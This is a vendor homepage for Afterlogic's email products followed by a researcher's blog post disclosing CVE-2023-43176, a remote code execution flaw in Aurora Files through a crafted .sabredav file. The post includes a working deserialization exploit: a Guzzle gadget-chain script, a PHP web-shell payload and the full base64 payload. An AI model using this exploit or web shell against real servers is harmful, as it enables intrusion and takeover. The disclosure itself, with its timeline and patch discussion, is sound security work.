=== Content from afterlogic.com_16fcd9e4_20250110_220948.html ===
      [![Afterlogic](https://afterlogic.com/images/logo.svg)](https://afterlogic.com/)     [Menu](#main-menu)

* [Products](/products)
  + .NET Components
  + [![](/images/menu/icon3.png) MailBee.NET Objects .NET email components: SMTP, POP3, IMAP, EWS, Security, AntiSpam, Outlook, Address Validator, PDF](/mailbee-net/email-components ".NET email components: SMTP, POP3, IMAP, EWS, Security, AntiSpam, Outlook, Address Validator, PDF ")
  + [![](/images/menu/icon1.png) MailBee.NET Queue Easy-to-use .NET service to deliver e-mails in the background](/mailbee-net/queue "Easy-to-use .NET service to deliver e-mails in the background")
  + ActiveX Components
  + [![](/images/menu/icon2.png) MailBee Objects ActiveX email components: SMTP, POP3, IMAP, S/MIME](/mailbee/objects "ActiveX email components: SMTP, POP3, IMAP, S/MIME")
  + [![](/images/menu/icon1.png) MailBee Message Queue Queue-based background sending of emails](/mailbee/message-queue "Queue-based background sending of emails")
  + Web scripts
  + [![](/images/menu/icon4.png) WebMail Pro PHP Webmail front-end for your existing mail server, with personal calendar, contacts, and mobile sync](/webmail-client "Webmail front-end for your existing mail server, with personal calendar, contacts, and mobile sync")
  + [![](/images/menu/icon4.png) WebMail Pro ASP.NET Webmail front-end for your existing mail server, with calendar sharing and global contacts](/webmail-client-asp-net "Webmail front-end for your existing mail server, with calendar sharing and global contacts")
  + [![](/images/menu/activeserver.png) ActiveServer Premium addon which brings ActiveSync support to WebMail Pro and Aurora](/activeserver "Premium addon which brings ActiveSync support to WebMail Pro and Aurora")
  + Solutions
  + [![](/images/menu/icon9.png) Aurora Corporate Groupware system for businesses and providers](/aurora "Groupware system for businesses and providers")
  + [![](/images/menu/icon9.png) Aurora Files Your personal cloud storage](https://afterlogic.org/aurora-files "Your personal cloud storage")
  + [![](/images/menu/triton.png) Triton Transactional and newsletter emails sending solution](/triton "Transactional and newsletter emails sending solution")
  + [![](/images/menu/icon5.png) MailSuite Pro for Linux Mail server (MTA) bundled with WebMail Pro for a complete solution](/mailsuite/linux-email-server "Mail server (MTA) bundled with WebMail Pro for a complete solution")
  + [![](/images/menu/icon7.png) Unified Messaging Solution Technology platform which provides telecom users with a feature-rich messaging portal](/ums "Technology platform which provides telecom users  with a feature-rich messaging portal")
* [Purchase](/purchase)
  + [All Products](/purchase/order-online)
  + [Maintenance renewal](/maintenance-renewal)
  + [Resellers](/resellers)
* [Support](/support)
  + [Helpdesk](https://s.afterlogic.com/helpdesk/)
  + [Online documentation](/docs)
  + [Web forum](https://s.afterlogic.com/forum/)
* [Our Clients](/clients)
* [Services](https://afterlogic.works)
* [About](/contact-info)
  + [About us](/about)
  + [News](/news)
  + [Contact](/contact)

* [![](https://afterlogic.com/images/slider/mailbee-net-objects-min.jpg)](/mailbee-net/email-components)
* [![](https://afterlogic.com/images/slider/webmail-pro-min.jpg)](/webmail-client-8)
* [![](https://afterlogic.com/images/slider/aurora-new-min.jpg)](/aurora-8)

Afterlogic Corp. is an award-winning technological company creating world-leading email and telecommunications components, software and platforms since 2002

     [![](/images/menu/icon2.png)**MailBee.NET Objects**](/mailbee-net/email-components)

Brings e-mail capabilities to your .NET applications in a few lines of code.
You may choose a part of MailBee.NET Objects by standard
([SMTP](/mailbee-net/smtp-component),
[POP3](/mailbee-net/pop3-component),
[IMAP](/mailbee-net/imap-component),
[SSL](/mailbee-net/security-component),
[AntiSpam](/mailbee-net/antispam-component),
[Address Validator](/mailbee-net/address-validator),
[Outlook](/mailbee-net/outlook-converter))
or by task:
[create and send](/mailbee-net/smtp-component),
[receive](/mailbee-net/pop3-component),
[parse](/mailbee-net/email-components),
[manage IMAP](/mailbee-net/imap-component),
[protect](/mailbee-net/security-component),
[bulk](/mailbee/message-queue) e-mails,
[make them safe](/mailbee-net/docs/#MailBee.Html.RuleSet.GetSafeHtmlRules.html),
[protect from spam](/mailbee-net/antispam-component),
convert to [Outlook .MSG](/mailbee-net/outlook-converter) or to [PDF](/mailbee-net/pdf-converter).

For developers who use classic ASP, Delphi or VB6, we offer ActiveX version – [MailBee Objects](/mailbee/objects).

     [![](/images/menu/icon4.png)**AfterLogic WebMail Pro**](/webmail-client)

Webmail front-end for your existing IMAP mail server. It uses powerful AJAX interface for faster access to your emails. Available for both major web platforms: ASP.NET (Windows only) and PHP (Linux/Windows).

     [![](/images/menu/icon9.png)**Aurora Corporate**](/aurora)

This messaging and collaboration solution includes a groupware-enabled webmail, corporate contacts, calendars, files storage, and an optional SMTP/POP3/IMAP server with anti-spam and anti-virus protection (or can use your existing MTA). Supports CalDAV, CardDAV, ActiveSync ([option](/activeserver)), Outlook sync, Google Drive and Dropbox integration. Written in PHP.

## Our clients

   ![AirBus](/images/clients/airbus.png) AirBus   ![Akna](/images/clients/akna.png) Akna   ![Alcatel-Lucent](/images/clients/alcatel.png) Alcatel-Lucent   ![AOL](/images/clients/aol.png) AOL   ![AT&T](/images/clients/att.png) AT&T   ![Bechtel](/images/clients/bechtel.png) Bechtel   ![Bell Mobility](/images/clients/bell.png) Bell Mobility   ![Berkeley University](/images/clients/berkeley.png) Berkeley University   ![Bosch](/images/clients/bosch.png) Bosch   ![British Transport Police](/images/clients/british-transport-police.png) British Transport Police   ![Carnegie Mellon University](/images/clients/carnegie.png) Carnegie Mellon University   ![Centers for Disease Control and Prevention](/images/clients/cdc.png) Centers for Disease Control and Prevention   ![CERN](/images/clients/cern.png) CERN   ![Chamber of Deputies](/images/clients/chamber-of-deputies-italia.png) Chamber of Deputies   ![Cisco Systems](/images/clients/cisco-systems.png) Cisco Systems   ![Datawatch](/images/clients/datawatch.png) Datawatch   ![Edinburgh University](/images/clients/edinburgh-university.png) Edinburgh University   ![Federal State Institution Russian State Library](/images/clients/federal-state-institution-russian-state-library.png) Federal State Institution Russian State Library   ![Freescale Semiconductor](/images/clients/freescale.png) Freescale Semiconductor   ![Fuji Xerox](/images/clients/fuji-xerox.png) Fuji Xerox   ![General Electric](/images/clients/general-electric.png) General Electric   ![Go Daddy](/images/clients/godaddy.png) Go Daddy   ![Government of Saskatchewan, Canada](/images/clients/government-saskatchewan.png) Government of Saskatchewan, Canada   ![Government of South Australia](/images/clients/government-south-australia.png) Government of South Australia   ![Harvard University](/images/clients/harvard-university.png) Harvard University   ![Hewlett-Packard](/images/clients/hp.png) Hewlett-Packard   ![HITACHI](/images/clients/hitachi.png) HITACHI   ![IBM](/images/clients/ibm.png) IBM   ![Intuit Inc.](/images/clients/intuit.png) Intuit Inc.   ![Konica Minolta](/images/clients/konica-minolta.png) Konica Minolta   ![Lockheed Martin](/images/clients/lockheed-martin.png) Lockheed Martin   ![LSI Logic](/images/clients/lsi.png) LSI Logic   ![McAfee](/images/clients/mcafee.png) McAfee   ![Mchost](/images/clients/mchost.png) Mchost   ![Miele](/images/clients/miele.png) Miele   ![MOTOROLA](/images/clients/motorola.png) MOTOROLA    [and thousands more](/clients)              © Copyright 2002-2025 Afterlogic Corp.      [![Find us on facebook](https://afterlogic.com/images/social_links/facebook-footer.png)](http://www.facebook.com/afterlogic "Find us on facebook")   [![Follow us on twitter](https://afterlogic.com/images/social_links/twitter-footer.png)](http://twitter.com/afterlogic "Follow us on twitter")

* [Privacy policy](/privacy-policy)
* [Refund policy](/refund-policy)
          ![](//googleads.g.doubleclick.net/pagead/viewthroughconversion/1070406031/?guid=ON&script=0)

=== Content from sec.leonardini.dev_3166bcdb_20250110_221020.html ===

## Lorenzo Leonardini's security blog

  [posts](/)   [about](/about)  [bluesky](https://bsky.app/profile/sec.leonardini.dev) [twitter](https://twitter.com/_lorenzo_leo) [main site](https://leonardini.dev)
# CVE-2023-43176: Remote Code Execution on Aurora Files <= 9.7.3

Sep 28, 2023

---

[Aurora Files](https://afterlogic.org/aurora-files) is an *“open source file storage and sharing platform”* developed by [Afterlogic](https://afterlogic.org/). This blog posts revolves around a vulnerability I found, assigned [CVE-2023-43176](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43176), that allows an attacker to perform remote code execution on the server by uploading a malicious `.sabredav` file containing a serialized PHP object.

## Overview

Aurora Files is an open source cloud storage solution that allows you to upload and manage files and share them with other users. It’s designed as a basic framework paired with many separate modules that implement every small feature of the platform. Such modules include, among others: the main web UI, an administrative API, basic file storage, end-to-end encrypted storage, and S3-based storage. Aurora is therefore completely modular and can be expanded and/or modified as one sees fit.

In order to offer its functionality to third-party clients, Aurora supports the [WebDAV](https://en.wikipedia.org/wiki/WebDAV) protocol, and exposes a WebDAV server. In fact, Aurora uses WebDAV to manage files internally as well. The protocol and its functionality is offered via the famous [SabreDAV](https://sabre.io/) PHP library. We will come back to this very shortly.

During recent testings I found a vulnerability that allows any authenticated user to perform remote code execution on the server. What follows is a brief timeline of the events:

 September, 1st 2023*I contacted Afterlogic reporting the vulnerability*September, 4th 2023*I received an initial response aknowledging the report*September, 4th 2023*A first (broken) patch is pushed on Afterlogic’s GitHub*September, 6th 2023*I received a second email confirming the vulnerability and presenting the patch*September, 8th 2023*The broken patch gets fixed*September, 9th 2023*I sent a request to MITRE to reserve a CVE number for this vulnerability*September, 12th 2023*Version 9.7.4 was released, containing the patch*September, 25th 2023*MITRE reserved CVE ID `CVE-2023-43176` for this vulnerability*
## The vuln

As I introduced before, Aurora Files uses SabreDAV to internally manage files. In particular, each user has one or more folders containing their personal files, each of them structured exactly as you see them in the web interface, with all the subfolders you decide to create and use to manage your files.

To store and manage metadata, each folder contains a special hidden file, named `.sabredav`, containing all the information of all the files contained in that folder. Such information include basic properties such as the file owner, as well as extended properties added and managed by the different file storage modules. All this data is stored as a serialized PHP object.

```
a:2:{s:13:"test-file.txt";a:1:{s:10:"properties";a:2:{s:5:"Owner";s:17:"email@example.com";s:13:"ExtendedProps";a:0:{}}}s:21:"another-test-file.png";a:1:{s:10:"properties";a:2:{s:5:"Owner";s:17:"email@example.com";s:13:"ExtendedProps";a:0:{}}}}
```

What I noticed during testing is that empty folders don’t have a `.sabredav` file, as it gets created only after you upload the first file. This made me wonder whether it was possible to upload a custom `.sabredav` file in an empty folder. Turns out, it sure is! Further testing revealed that the custom `.sabredav` file gets in fact deserialized by the server, in order to attempt to read all the folder’s files metadata.

After having confirmed I had arbitrary object deserialization, I just needed to find out what I could do with that. As many other modern PHP projects, Aurora Files uses [Composer](https://getcomposer.org/) to manage its dependencies, and makes use of an autoloader to automatically import files and classes. This means that we can use gadgets from any library.

One of Aurora’s dependencies is [Guzzle](https://docs.guzzlephp.org/), a PHP HTTP client, that among its classes has a `FileCookieJar` that defines a `__destruct` method we can exploit to gain arbitrary file write:

GuzzleHttp/Cookie/FileCookieJar.php

```
/**
 * Saves the file when shutting down
 */
public function __destruct()
{
    $this->save($this->filename);
}

/**
 * Saves the cookies to a file.
 *
 * @param string $filename File to save
 *
 * @throws \RuntimeException if the file cannot be found or created
 */
public function save(string $filename): void
{
    $json = [];
    /** @var SetCookie $cookie */
    foreach ($this as $cookie) {
        if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
            $json[] = $cookie->toArray();
        }
    }

    $jsonStr = Utils::jsonEncode($json);
    if (false === \file_put_contents($filename, $jsonStr, \LOCK_EX)) {
        throw new \RuntimeException("Unable to save file {$filename}");
    }
}
```

With this we can write a PHP backdoor in the root directory, allowing us to gain arbitrary remote code execution on the server. The following script generates a malicious `.sabredav` file, with a standard `system($_GET['command'])` payload:

```
$cookie = new \GuzzleHttp\Cookie\SetCookie([
    'Name' => 'custom',
    'Domain' => 'example.com',
    'Value' => 'asd',
    'Discard' => false,
    'custom' => '<?php system($_GET[\'command\']); ?>'
]);

$jar = new \GuzzleHttp\Cookie\FileCookieJar('./backdoor.php', true);
$jar->setCookie($cookie);

file_put_contents(".sabredav", serialize($jar));
```

Here is the malicious `.sabredav` file itself, base64-encoded due to it containing null-bytes:

```
TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YToxMDp7czo0OiJOYW1lIjtzOjY6ImN1c3RvbSI7czo1OiJWYWx1ZSI7czozOiJhc2QiO3M6NjoiRG9tYWluIjtzOjExOiJleGFtcGxlLmNvbSI7czo0OiJQYXRoIjtzOjE6Ii8iO3M6NzoiTWF4LUFnZSI7TjtzOjc6IkV4cGlyZXMiO047czo2OiJTZWN1cmUiO2I6MDtzOjc6IkRpc2NhcmQiO2I6MDtzOjg6Ikh0dHBPbmx5IjtiOjA7czo2OiJjdXN0b20iO3M6MzQ6Ijw/cGhwIHN5c3RlbSgkX0dFVFsnY29tbWFuZCddKTsgPz4iO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7YjowO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjE0OiIuL2JhY2tkb29yLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30=
```

After uploading the malicious `.sabredav` file we can finally test the backdoor:

![Testin the backdoor with the Linux id command](/cve-2023-43176/cve-2023-43176-aurora-backdoor.png)

## The patch

The easiest fix for this vulnerability is to blacklist the upload of any files named `.sabredav`. At the same time, proper checks need to be put in place when renaming or moving files around, in order to stop attackers from baing able to write malicious `.sabredav` files. This is the approach adopted to fix the vulnerability in Aurora Files 9.7.4 ([first commit](https://github.com/afterlogic/aurora-module-personalfiles/commit/083c15daac72c8f5bd27db9cf248a599410c9cf0), [second commit](https://github.com/afterlogic/aurora-module-personalfiles/commit/547353b7ca2716fe9d751f169364efa1fe1cd54f)).

However, such a patch should only be considered temporary, as future changes and updates to the codebase might introduce ways to bypass these filters. The optimal solution would be to completely remove PHP object serialization and deserialization, as file metadata might be easily stored in a JSON file or database. Afterlogic agreed with me and informed me their long-term plan is to remove the `.sabredav` file entirely in favour of a database.

## Conclusions

If you are using Aurora Files <= 9.7.3 it is extremely important to update your installation to the latest version. I believe Afterlogic deserves to be praised for how quickly they have been responding to my emails, as they never took more than a business day to get back to me. Properly handling security issues is of extreme importance and being able to quickly discuss and solve such issues is really fundamental in order to keep products secure. The only thing I feel I should criticize is the absence of any reference to this issue in the latest changelog: users should be informed of security fixes in order to properly update and keep their installations safe.

All in all, my first CVE experience went pretty smoothly!

  © Lorenzo Leonardini. All rights reserved.
